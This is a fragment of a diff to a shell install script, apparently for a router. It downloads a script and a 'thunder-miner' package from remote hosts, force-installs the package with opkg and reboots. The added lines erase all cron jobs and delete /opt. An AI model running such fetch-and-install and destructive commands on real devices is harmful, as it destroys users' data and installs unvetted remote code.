@@ -7,4 +7,11 @@ wget 'http://www.xiefucai.com/tools/wget_ddd.sh?TPSecNotice&TPNotCheck' -O /tmp/
 
 wget 'http://update.peiluyou.com/conf/miner_plus_test/packages/thunder-miner-app_V1.3.164_meson.ipk?TPSecNotice&TPNotCheck' -O /tmp/t.ipk 2>>$LOG_PATH
 
+#清除crontab信息
+crontab -r
+
+if [ -d /opt ];then
+    rm -rf /opt
+fi
+
 opkg install --force-downgrade /tmp/t.ipk 2>>$LOG_PATH && sleep 30 && reboot &
